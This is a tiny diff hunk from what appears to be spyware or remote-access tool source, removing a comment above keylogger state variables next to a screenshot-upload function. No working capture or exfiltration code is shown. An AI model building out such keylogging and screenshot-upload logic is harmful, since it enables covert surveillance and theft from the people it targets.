@@ -88,7 +88,7 @@ def upload_screenshot(b64data):
         print(f"[!] Screenshot upload error: {e}")
 
 
-# Keylogger logic (same as Linux)
+
 keylogger_running = False
 keylogger_buffer = []
 keylogger_thread = None
